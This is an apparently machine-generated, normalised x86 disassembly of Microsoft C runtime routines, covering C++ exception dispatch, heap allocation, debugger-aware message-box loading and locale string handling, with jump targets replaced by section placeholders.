push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push edi
push [ ebp + 0x8 ]
call sub_4178a8
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop ebp
retn
push edi
push eax
call sub_410bc7
call sub_410bf7
push esi
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_417b09
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
push [ eax + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_417072
add esp 0x2c
pop esi
test eax eax
je r-xdata
sub_4172fb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_415d5f
xor ecx ecx
inc ecx
mov [ eax + 0x3ac ] ecx
mov eax ecx
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_417348
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
xor ebx ebx
cmp [ edi + 0x4 ] 0x80
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x1 ] bl
jg r-xdata
mov eax [ eax + 0x8 ]
movsx eax [ eax + 0x8 ]
jmp r-xdata
call sub_4165c0
cmp eax [ edi + 0x4 ]
jl r-xdata
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_415d5f
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ ebp + 0x1c ] bl
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_4165c0
call sub_4165f8
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push esi
call sub_4176e3
add esp 0x20
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_415d5f
cmp [ eax + 0x88 ] ebx
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
call sub_415d5f
mov esi [ eax + 0x88 ]
call sub_415d5f
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x24 ] 0x1
call sub_41c7cc
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_4165c0
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_410b48
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x28 ]
jae r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
call sub_415d5f
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_416f9c
pop ecx
pop ecx
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
call sub_415d5f
mov eax [ eax + 0x94 ]
mov [ ebp - 0x14 ] eax
call sub_415d5f
push [ ebp - 0x14 ]
mov [ eax + 0x94 ] ebx
push esi
call sub_4177fd
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc ecx
add edx 0x14
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
cmp ecx [ ebp - 0x28 ]
jb r-xdata
cmp eax [ edx - 0xc ]
jg r-xdata
mov edi [ ebp - 0x14 ]
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
lea ebx [ edx - 0x10 ]
mov [ ebp - 0x2c ] ebx
mov ebx [ ebp + 0xc ]
cmp [ edx - 0x10 ] eax
jg r-xdata
xor ebx ebx
mov edi [ edx ]
mov [ ebp - 0xc ] edi
mov edi [ edx - 0x4 ]
mov [ ebp - 0x20 ] edi
test edi edi
mov edi [ ebp + 0x18 ]
jle r-xdata
mov eax ebx
mov [ ebp + 0x18 ] ebx
call sub_4165c0
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ edi + 0x1c ]
push esi
call sub_4177fd
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
push 0x1
push esi
call sub_416f9c
pop ecx
pop ecx
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp - 0x3c ]
mov [ ebp + 0x18 ] r--data
call sub_40f72b
push r--data
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x3c ] r--data
call sub_4107db
mov eax [ ebp + 0x18 ]
inc ebx
add eax 0x10
mov [ ebp + 0x18 ] eax
cmp ebx [ edi ]
jl r-xdata
call sub_415d5f
call sub_415d5f
call sub_415d5f
mov [ eax + 0x88 ] esi
call sub_415d5f
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] edx
test eax eax
jg r-xdata
mov ecx [ edi + 0x4 ]
push rw-data
mov ecx [ eax + ecx + 0x4 ]
call sub_40e702
test al al
jne r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0x1c ]
mov eax [ edx ]
push eax
push ecx
mov [ ebp - 0x30 ] eax
call sub_417cc1
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x20 ]
dec eax
add ecx 0x10
mov [ ebp - 0x20 ] eax
mov [ ebp - 0xc ] ecx
test eax eax
jg r-xdata
call sub_410bf7
push 0xffffffff
push edi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_417b09
add esp 0x10
push [ edi + 0x1c ]
call sub_417240
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x30 ]
push [ ebp - 0xc ]
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
push ebx
push esi
call sub_417280
add esp 0x2c
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
dec eax
add edx 0x4
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
sub_4176e3
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x80000003
je r-xdata
pop edi
leave
retn
push ebx
push esi
call sub_415d5f
cmp [ eax + 0x80 ] 0x0
mov ebx [ ebp + 0x18 ]
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
call sub_415d5f
cmp [ eax + 0x80 ] esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push ebx
call sub_410b48
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
add esp 0x14
cmp ecx edx
jae r-xdata
call sub_4165c0
cmp [ edi ] 0xe0434f4d
je r-xdata
pop esi
pop ebx
lea esi [ eax + 0xc ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] 0xe0434352
je r-xdata
inc ecx
add esi 0x14
mov [ ebp - 0x8 ] ecx
cmp ecx edx
jb r-xdata
cmp eax [ esi - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_410a73
add esp 0x1c
test eax eax
jne r-xdata
cmp eax [ esi - 0xc ]
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
shl eax 0x4
mov edi [ edi + eax - 0xc ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
add edi 0xfffffff0
add eax edi
mov edi [ ebp + 0x8 ]
test [ eax ] 0x40
jne r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ edx + eax - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0x8 ] 0x0
mov ebx [ ebp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
push 0x1
push [ ebp + 0x24 ]
lea ecx [ esi - 0xc ]
push [ ebp + 0x20 ]
push ecx
push 0x0
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_417280
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
add esp 0x2c
sub_4177fd
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
call sub_4165c0
xor ebx ebx
mov edi ebx
cmp [ esi ] ebx
jle r-xdata
pop edi
pop esi
mov al bl
pop ebx
leave
retn
mov ecx ebx
mov [ ebp + 0xc ] ebx
inc edi
add ecx 0x10
mov [ ebp + 0xc ] ecx
cmp edi [ esi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
mov eax [ esi + 0x4 ]
push [ edx ]
add eax ecx
push eax
call sub_417cc1
mov ecx [ ebp + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
test eax eax
jle r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
dec eax
add edx 0x4
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edx
test eax eax
jg r-xdata
jmp r-xdata
sub_417883
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
add eax edx
test esi esi
js r-xdata
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ esi + edx ]
mov ecx [ edx + ecx ]
add ecx esi
add eax ecx
sub_4178a8
push 0x8
push r--data
call sub_4110a0
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test [ edx ] 0x80000000
je r-xdata
lea edi [ ecx + 0xc ]
add edi [ edx + 0x8 ]
mov edi ecx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_417883
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_410a6c
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push edx
push ecx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_417936
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4110e5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_417883
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_410a6c
jmp r-xdata
sub_417936
push 0xc
push r--data
call sub_4110a0
xor ebx ebx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] bl
je r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ eax ]
mov edi [ ebp + 0xc ]
test edx edx
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] ebx
push 0x1
test dl 0x8
je r-xdata
add edi 0xc
add edi ecx
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
call sub_41c7cc
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
call sub_41c7cc
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4165c0
push 0x1
push edi
call sub_41c7cc
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41c7cc
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41c7cc
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_41c7cc
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x18 ]
mov [ edi ] ecx
mov eax [ ebp + 0x14 ]
add eax 0x8
push eax
push ecx
push 0x1
push edi
call sub_41c7cc
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_41c7cc
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push edi
call sub_40e0b0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
jmp r-xdata
push [ esi + 0x18 ]
call sub_41c7cc
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
lea eax [ esi + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_417883
pop ecx
pop ecx
push eax
push edi
call sub_40e0b0
add esp 0xc
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
call sub_4110e5
retn
test [ esi ] 0x4
push 0x0
pop ebx
setne bl
inc ebx
mov [ ebp - 0x1c ] ebx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi ]
jmp r-xdata
call sub_417883
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_417abb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe0434352
je r-xdata
call sub_415d5f
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp [ eax ] 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_415d5f
dec [ eax + 0x90 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
call sub_415d5f
and [ eax + 0x90 ] 0x0
jmp sub_4165f8
sub_417b09
push 0x10
push r--data
call sub_4110a0
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x4 ] 0x80
mov eax [ ebp + 0x8 ]
jg r-xdata
mov esi [ eax + 0x8 ]
movsx esi [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417bc8
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_415d5f
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] esi
call sub_4110e5
retn
call sub_4165c0
call sub_4165c0
mov eax [ ebp + 0x10 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x8 ]
mov edx [ eax + esi * 8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + esi * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
push 0x103
push eax
mov eax [ ecx + 0x8 ]
push [ eax + esi * 8 + 0x4 ]
call sub_416f50
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_417be2
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_415d5f
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x8 ]
xor esi esi
mov ebx 0xe06d7363
mov edi 0x19930522
cmp [ eax + 0x3ac ] esi
jne r-xdata
test [ edx + 0x4 ] 0x66
je r-xdata
cmp [ edx ] ebx
je r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
cmp [ edx ] 0x80000026
je r-xdata
cmp [ edx ] ebx
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax edi
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_417348
add esp 0x20
cmp [ edx + 0x10 ] 0x3
jb r-xdata
cmp [ ecx + 0x1c ] esi
je r-xdata
push 0xffffffff
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_417b09
add esp 0x10
jmp r-xdata
test [ ecx + 0x20 ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] edi
jbe r-xdata
mov eax [ edx + 0x1c ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
movzx eax [ ebp + 0x24 ]
push eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call esi
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417cc1
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea ecx [ eax + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
mov edi [ ebp + 0xc ]
mov edx [ edi + 0x4 ]
cmp eax edx
je r-xdata
test [ edi ] 0x2
je r-xdata
lea eax [ edx + 0x8 ]
push eax
push ecx
call sub_410e60
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test [ eax ] 0x1
je r-xdata
test [ esi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test [ eax ] 0x2
je r-xdata
test [ esi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ esi ] 0x2
je r-xdata
sub_417d1e
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40e92a
pop ecx
pop ebp
retn
push ebx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40e8f2
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_410f5d
pop ecx
call sub_411550
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
inc esi
mov eax ebx
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop ebx
call sub_411550
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_411563
pop ecx
mov [ esi ] eax
push esi
call sub_410f5d
pop ecx
test eax eax
je r-xdata
call sub_411550
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_411563
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_417dc9
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jae r-xdata
xor ecx ecx
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_411550
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push esi
call sub_410f5d
pop ecx
test eax eax
jne r-xdata
mov eax ecx
mov [ eax ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov [ eax ] 0xc
sub_417e5e
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ EncodePointer@IAT ]
push esi
push edi
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
xor edi edi
push edi
mov [ ebp - 0x20 ] eax
call ebx
mov esi eax
mov [ ebp - 0x18 ] esi
call sub_414e1b
mov [ ebp - 0x14 ] eax
cmp [ rw-data ] edi
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
push 0x800
push edi
push r--data
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
mov eax [ rw-data ]
mov ebx [ DecodePointer@IAT ]
cmp eax esi
je r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
push 0x3
jmp r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
push eax
call [ OutputDebugStringW@IAT ]
xor eax eax
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop eax
jmp r-xdata
push 0x4
mov esi [ ebp - 0x18 ]
push r--data
push esi
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
mov esi [ ebp + 0x10 ]
push eax
call ebx
test eax eax
je r-xdata
push eax
call ebx
push [ rw-data ]
mov [ ebp - 0x14 ] eax
call ebx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
push esi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push edi
call eax
jmp r-xdata
call eax
mov edi eax
test edi edi
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call ecx
test eax eax
je r-xdata
push eax
call ebx
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
or esi 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ ebp - 0x18 ]
test eax eax
je r-xdata
push edi
call eax
mov edi eax
push [ rw-data ]
call ebx
test eax eax
je r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_418040
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov eax [ esi * 8 + r--data ]
jns r-xdata
lea edi [ esi + 0x1 ]
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
push 0x55
push [ esi * 8 + r--data ]
push [ ebp + 0x8 ]
call sub_418104
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41808e
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_418040
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_4180b8
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41808e
pop ecx
push eax
call [ LCMapStringW@IAT ]
pop ebp
retn
xor ecx ecx
push ecx
push ecx
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_418104
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp + 0x10 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
dec esi
je r-xdata
cmp ax [ ebp + 0x10 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_418172
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_411550
mov [ eax ] 0x9
jmp r-xdata
call sub_411550
mov [ eax ] 0x9
call sub_411714
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
movsx eax [ eax + ecx + 0x4 ]
and eax 0x40
pop ebp
retn
sub_4181c6
push ebp
mov ebp esp
inc [ rw-data ]
push esi
mov esi 0x1000
push esi
call sub_41100b
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] esi
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop esi
pop ebp
retn
sub_41820c
push ebp
mov ebp esp
sub esp 0x488
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x428 ] eax
xor eax eax
mov ebx eax
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x408 ] esi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x430 ] eax
call sub_40f858
call sub_411550
mov [ ebp - 0x45c ] eax
cmp [ ebp - 0x428 ] ebx
jne r-xdata
test esi esi
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
cmp [ ebp - 0x440 ] bl
xor ecx ecx
mov eax ecx
mov edx ecx
mov [ ebp - 0x434 ] ecx
mov [ ebp - 0x458 ] ecx
movzx ecx [ esi ]
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x414 ] edx
mov [ ebp - 0x41c ] ecx
test cx cx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov esi [ ebp - 0x46c ]
mov [ ebp - 0x474 ] 0x58
